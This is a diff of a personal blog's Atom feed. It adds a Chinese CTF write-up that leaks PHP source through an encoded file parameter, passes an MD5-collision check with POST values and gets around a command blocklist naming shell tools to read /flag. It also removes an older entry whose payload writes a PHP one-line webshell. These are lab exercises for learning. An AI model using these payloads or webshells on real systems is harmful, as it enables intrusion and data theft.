@@ -6,7 +6,7 @@
   <link href="http://daweitech.github.io/atom.xml" rel="self"/>
   
   <link href="http://daweitech.github.io/"/>
-  <updated>2021-08-07T08:06:04.188Z</updated>
+  <updated>2021-08-09T01:36:00.638Z</updated>
   <id>http://daweitech.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>安洵杯 2019 easy_web</title>
+    <link href="http://daweitech.github.io/2021/08/08/buu/10/"/>
+    <id>http://daweitech.github.io/2021/08/08/buu/10/</id>
+    <published>2021-08-08T13:33:02.000Z</published>
+    <updated>2021-08-09T01:36:00.638Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h5 id="MD5碰撞的一些例子"><a href="#MD5碰撞的一些例子" class="headerlink" title="MD5碰撞的一些例子"></a>MD5碰撞的一些例子</h5><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p><h5 id="PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题"><a href="#PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题" class="headerlink" title="PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题"></a>PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</h5><p><a href="https://sp4rkw.blog.csdn.net/article/details/79088218">https://sp4rkw.blog.csdn.net/article/details/79088218</a></p><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p><p><img src="/2021/08/08/buu/10/image-20210809085159186.png" alt="image-20210809085159186"></p><p>观察到url路径存在参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>感觉这里就是切入点，img背后的似乎是base64码</p><p>在线解码一下（<a href="https://base64.us/%EF%BC%89%EF%BC%9A">https://base64.us/）：</a></p><p>TXpVek5UTTFNbVUzTURabE5qYz0</p><p>MzUzNTM1MmU3MDZlNjc=</p><p>3535352e706e67</p><p>连续两次base64解码后，得到一串字符串</p><p>查了资料，这是hex编码</p><p><img src="/2021/08/08/buu/10/image-20210809085725782.png" alt="image-20210809085725782"></p><p>再次解码：得到555.png，有意思</p><p>刚好靶机页面上就有一张哭泣图片</p><p>我们猜测，img后面的多次编码的参数请求可以得到源码</p><p>按照上面的解码逆推编码，可以得到</p><p>index.php:</p><p>696E6465782E706870</p><p>Njk2RTY0NjU3ODJFNzA2ODcw</p><p>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p><p>将参数修改</p><p><img src="/2021/08/08/buu/10/image-20210809090352667.png" alt="image-20210809090352667"></p><p>f12查看</p><p><img src="/2021/08/08/buu/10/image-20210809090426959.png" alt="image-20210809090426959"></p><p>对base64解码得到源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd</span><br></pre></td></tr></table></figure><p>这里对cmd的值进行了正则过滤，一般的l像s指令都不可以用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">       echo &#96;$cmd&#96;;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">       echo (&quot;md5 is funny ~&quot;);</span><br></pre></td></tr></table></figure><p>这里说明我们需要POST两个变量：a和b</p><p>它们作为字符串时的值弱比较不相等，md5加密的值强比较要相等（<strong>md5碰撞</strong>）</p><p>这里不太理解，所以先直接抄了wp的md5值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>POST传参</p><p>这里最好不要用hackbar，因为hackbar好像会把md5值再编码</p><p>（这个地方坑了我好久）</p><p>在请求到包后，直接在bp里改包</p><p>原来的GET请求直接改成POST请求</p><p><img src="/2021/08/08/buu/10/image-20210809092901502.png" alt="image-20210809092901502"></p><p>使用还没被ban掉的dir指令</p><p>查询到文件</p><p><img src="/2021/08/08/buu/10/image-20210809092634318.png" alt="image-20210809092634318"></p><p>然后直接用了多数博客都使用的绕过方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;ca\t%20&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2021/08/08/buu/10/image-20210809093215609.png" alt="image-20210809093215609"></p><p>看网上还有一种方法读取flag：</p><p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p><p><img src="/2021/08/08/buu/10/1625650-20200130214928556-987685402.png" alt="img"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12244096.html">https://www.cnblogs.com/wangtanzhi/p/12244096.html</a></p><p><a href="https://blog.csdn.net/qq_43622442/article/details/106012150">https://blog.csdn.net/qq_43622442/article/details/106012150</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;h5 id=&quot;MD5碰撞的一些例子&quot;&gt;&lt;a href=&quot;#MD5碰撞的一些例子&quot; class=&quot;head</summary>
+      
+    
+    
+    
+    
+    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
+    
+  </entry>
   
   <entry>
     <title>BJDCTF2020 Mark loves cat</title>
@@ -465,30 +487,6 @@
     
     
     <category term="攻防世界_misc" scheme="http://daweitech.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>nep题一些理解</title>
-    <link href="http://daweitech.github.io/2021/03/24/nepnep/nepctf/"/>
-    <id>http://daweitech.github.io/2021/03/24/nepnep/nepctf/</id>
-    <published>2021-03-24T13:14:38.000Z</published>
-    <updated>2021-03-24T13:41:27.837Z</updated>
-    
-    <content type="html"><![CDATA[<p> 这次开开心心参加比赛，难过关掉比赛页面(太cai了)</p><p>讲讲三个方面签到题</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>靶机链接：<a href="http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/">http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  error_reporting(0);</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">  $nep &#x3D; $_GET[&#39;nep&#39;];</span><br><span class="line">  $len &#x3D; $_GET[&#39;len&#39;];</span><br><span class="line">  if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123;</span><br><span class="line">    eval(substr($nep,0,$len));</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    die(&#39;too long!&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这题是传参，也就是要用语句写出payload</p><p>payload:    ?len=-1&amp;nep=<code>$_GET[1]</code>;1&amp;1=echo &lt;?php eval($_POST[1]);&gt;2.php</p><p>我自己的理解就是，传上len和nep两个量，其中len=-1绕过函数，直接到下一个量</p><p>而nep量传参，赋值语句为一句话木马，并且要加上反斜杠，使得语句不会被过滤。</p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(114).png"></p><p><img src="/2021/03/24/nepnep/nepctf/Users/David/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(118).png"></p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(115).png"></p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(116).png"></p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(117).png"></p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><p>啊，其实很简单啊</p><p>好气，真的就是只要看出图形就好，我编码解码半天心累</p><p>这里用了一个神奇网站：<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p><p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(113).png"></p><h4 id="cyber"><a href="#cyber" class="headerlink" title="cyber"></a>cyber</h4><p>这里碰到了知识盲区：</p><p>猪圈密码，音符密码</p><p>看到宝藏文章：<a href="https://blog.csdn.net/Amherstieae/article/details/111134283">https://blog.csdn.net/Amherstieae/article/details/111134283</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt; 这次开开心心参加比赛，难过关掉比赛页面(太cai了)&lt;/p&gt;
-&lt;p&gt;讲讲三个方面签到题&lt;/p&gt;
-&lt;h4 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h4&gt;&lt;p&gt;靶机链接：&lt;a href=&quot;</summary>
-      
-    
-    
-    
-    
-    <category term="nep" scheme="http://daweitech.github.io/tags/nep/"/>
     
   </entry>
   
